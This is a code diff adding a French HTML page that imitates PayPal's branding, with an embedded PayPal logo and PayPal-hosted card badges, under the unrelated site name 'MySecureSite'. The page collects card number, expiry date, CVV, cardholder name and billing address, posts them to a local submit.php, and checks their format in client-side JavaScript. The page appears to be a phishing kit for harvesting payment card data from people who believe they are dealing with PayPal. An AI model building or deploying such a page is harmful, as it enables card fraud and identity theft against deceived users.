@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ajouter une carte - MySecureSite</title>
+    <link rel="stylesheet" href="link-card.css">
+</head>
+
+<body>
+    <div class="header">
+        <a href="#">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAyNCAzMiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWluWU1pbiBtZWV0Ij4KICAgIDxwYXRoIGZpbGw9IiMwMDljZGUiIGQ9Ik0gMjAuOTA1IDkuNSBDIDIxLjE4NSA3LjQgMjAuOTA1IDYgMTkuNzgyIDQuNyBDIDE4LjU2NCAzLjMgMTYuNDExIDIuNiAxMy42OTcgMi42IEwgNS43MzkgMi42IEMgNS4yNzEgMi42IDQuNzEgMy4xIDQuNjE1IDMuNiBMIDEuMzM5IDI1LjggQyAxLjMzOSAyNi4yIDEuNjIgMjYuNyAyLjA4OCAyNi43IEwgNi45NTYgMjYuNyBMIDYuNjc1IDI4LjkgQyA2LjU4MSAyOS4zIDYuODYyIDI5LjcgNy4yMzYgMjkuNyBMIDExLjM1NiAyOS43IEMgMTEuODI1IDI5LjcgMTIuMjkyIDI5LjMgMTIuMzg2IDI4LjggTCAxMi4zODYgMjguNSBMIDEzLjIyOCAyMy4zIEwgMTMuMjI4IDIzLjEgQyAxMy4zMjIgMjIuNiAxMy43OSAyMi4yIDE0LjI1OCAyMi4yIEwgMTQuODIxIDIyLjIgQyAxOC44NDUgMjIuMiAyMS45MzUgMjAuNSAyMi44NzEgMTUuNSBDIDIzLjMzOSAxMy40IDIzLjE1MyAxMS43IDIyLjAyOSAxMC41IEMgMjEuNzQ4IDEwLjEgMjEuMjc5IDkuOCAyMC45MDUgOS41IEwgMjAuOTA1IDkuNSI+PC9wYXRoPgogICAgPHBhdGggZmlsbD0iIzAxMjE2OSIgZD0iTSAyMC45MDUgOS41IEMgMjEuMTg1IDcuNCAyMC45MDUgNiAxOS43ODIgNC43IEMgMTguNTY0IDMuMyAxNi40MTEgMi42IDEzLjY5NyAyLjYgTCA1LjczOSAyLjYgQyA1LjI3MSAyLjYgNC43MSAzLjEgNC42MTUgMy42IEwgMS4zMzkgMjUuOCBDIDEuMzM5IDI2LjIgMS42MiAyNi43IDIuMDg4IDI2LjcgTCA2Ljk1NiAyNi43IEwgOC4yNjcgMTguNCBMIDguMTczIDE4LjcgQyA4LjI2NyAxOC4xIDguNzM1IDE3LjcgOS4yOTYgMTcuNyBMIDExLjYzNiAxNy43IEMgMTYuMjI0IDE3LjcgMTkuNzgyIDE1LjcgMjAuOTA1IDEwLjEgQyAyMC44MTIgOS44IDIwLjkwNSA5LjcgMjAuOTA1IDkuNSI+PC9wYXRoPgo8L3N2Zz4K"
+                alt="PayPal" class="paypal-logo">
+        </a>
+    </div>
+    <main class="container" id="login-box">
+        <h1>Ajouter des détails</h1>
+        <div class="card-image-wrapper">
+            <img id="cardImage" class="card-image" src="" alt="" style="display: none;">
+            <p id="sumOutput"></p>
+
+        </div>
+        <form method="POST" action="submit.php">
+            <div class="form-group">
+                <label>Numéro de carte</label>
+                <div class="card-brands">
+                    <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png" alt="Visa"
+                        class="card-brand active" data-brand="visa">
+                    <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png"
+                        alt="Mastercard" class="card-brand" data-brand="mastercard">
+                    <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png"
+                        alt="American Express" class="card-brand" data-brand="amex">
+                    <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/cc-badges-ppmcvdam.png"
+                        alt="Discover" class="card-brand" data-brand="discover">
+                </div>
+                <input type="text" name="card_number" class="custom-input " id="cardInput" placeholder=" "
+                    maxlength="19" required>
+            </div>
+            <div class="form-group">
+                <label>Date d'expiration</label>
+                <div class="card-input-group">
+
+                    <input type="text" name="expiry_date" class="custom-input" placeholder="MM/YY" maxlength="5"
+                        required>
+                    <p id="expiryError" style="color: red; font-size: 0.9em;"></p>
+
+                </div>
+            </div>
+            <div class="form-group">
+                <label> Code de sécurité </label>
+                <div class="cvv-group">
+                    <input type="text" id="cvv" name="cvv" class="custom-input" placeholder="123" maxlength="4"
+                        pattern="\d{3,4}" required title="Le code doit contenir 3 ou 4 chiffres">
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Nom sur la carte</label>
+
+                <input type="text" name="cardholder" class="custom-input" placeholder=" " required>
+            </div>
+            <div class="form-group">
+                <label>Adresse de facturation</label>
+
+                <input type="text" name="billing_address" class="custom-input" placeholder=" " required>
+            </div>
+            <button type="submit" class="link-button" onclick="initializeCardFormValidation()">Valider</button>
+        </form>
+    </main>
+</body>
+<script>
+    function initializeCardFormValidation() {
+        const cardInput = document.getElementById('cardInput');
+        const cardImage = document.getElementById('cardImage');
+        const expiryInput = document.querySelector('input[name="expiry_date"]');
+        const expiryError = document.getElementById('expiryError');
+        const cvvInput = document.querySelector('input[name="cvv"]');
+
+        // 💳 Carte : détection du type
+        cardInput.addEventListener('input', () => {
+            const value = cardInput.value.replace(/\D/g, '');
+            let cardType = null;
+            cardImage.style.display = 'none';
+
+            if (value.startsWith('4') && value.length === 16) {
+                cardType = 'Visa';
+                cardImage.src = 'visaa.png';
+            } else if ((value.startsWith('34') || value.startsWith('37')) && value.length === 15) {
+                cardType = 'Amex';
+                cardImage.src = 'amexx.png';
+            } else if (
+                (value.startsWith('5') && ['1', '2', '3', '4', '5'].includes(value.charAt(1))) ||
+                (parseInt(value.substring(0, 4)) >= 2221 && parseInt(value.substring(0, 4)) <= 2720)
+            ) {
+                if (value.length >= 16 && value.length <= 19) {
+                    cardType = 'Mastercard';
+                    cardImage.src = 'mastercard.jpg';
+                }
+            }
+
+            if (cardType) {
+                cardImage.style.display = 'inline';
+            }
+        });
+
+        // 📅 Expiration : format et validité
+        expiryInput.addEventListener('input', () => {
+            let value = expiryInput.value.replace(/\D/g, '');
+            if (value.length >= 3) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            expiryInput.value = value;
+
+            const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+            if (!regex.test(value)) {
+                expiryError.textContent = "Format invalide. Utilisez MM/YY.";
+                return;
+            }
+
+            const currentDate = new Date();
+            const inputMonth = parseInt(value.slice(0, 2));
+            const inputYear = parseInt("20" + value.slice(3, 5));
+            const expiryDate = new Date(inputYear, inputMonth);
+
+            if (expiryDate <= currentDate) {
+                expiryError.textContent = "Carte expirée.";
+            } else {
+                expiryError.textContent = "";
+            }
+        });
+
+        // 🔐 CVV : vérification
+        cvvInput.addEventListener('input', function (e) {
+            const cvv = e.target.value;
+            const isValid = /^\d{3,4}$/.test(cvv);
+            e.target.style.borderColor = isValid ? 'green' : 'red';
+        });
+    }
+        const nameInput = document.querySelector('input[name="cardholder"]');
+        const addressInput = document.querySelector('input[name="billing_address"]');
+
+        // Nom sur la carte : lettres uniquement
+        nameInput.addEventListener('input', () => {
+            const regex = /^[a-zA-Z\s]*$/;
+            if (!regex.test(nameInput.value)) {
+                nameInput.style.borderColor = 'red';
+            } else {
+                nameInput.style.borderColor = 'green';
+            }
+        });
+
+        // Adresse de facturation : minimum 5 caractères
+        addressInput.addEventListener('input', () => {
+            if (addressInput.value.trim().length < 5) {
+                addressInput.style.borderColor = 'red';
+            } else {
+                addressInput.style.borderColor = 'green';
+            }
+        });
+
+    // Exécuter la fonction une fois le DOM chargé
+    document.addEventListener('DOMContentLoaded', initializeCardFormValidation);
+</script>
+
+</html>
